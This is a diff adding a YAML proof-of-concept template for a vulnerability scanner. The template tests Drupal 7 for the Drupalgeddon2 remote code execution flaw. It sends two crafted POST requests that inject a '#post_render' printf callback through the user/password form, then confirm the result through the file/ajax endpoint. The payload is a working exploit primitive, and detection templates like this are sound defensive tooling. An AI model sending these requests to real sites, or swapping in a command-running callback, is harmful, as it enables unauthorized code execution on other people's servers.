@@ -1,0 +1,28 @@
+name: poc-yaml-drupal-drupalgeddon2-rce  # nolint[:namematch]
+set:
+  r1: randomLowercase(4)
+  r2: randomLowercase(4)
+rules:
+  - method: POST
+    path: "/?q=user/password&name[%23post_render][]=printf&name[%23type]=markup&name[%23markup]={{r1}}%25%25{{r2}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&opz=E-mail+new+Password
+    search: |
+      name="form_build_id"\s+value="(?P<build_id>.+?)"
+    expression: |
+      response.status == 200
+  - method: POST
+    path: "/?q=file%2Fajax%2Fname%2F%23value%2F{{build_id}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      form_build_id={{build_id}}
+    expression: |
+      response.body.bcontains(bytes(r1 + "%" + r2))
+detail:
+  drupal_version: 7
+  links:
+    - https://github.com/dreadlocked/Drupalgeddon2
+    - https://paper.seebug.org/567/
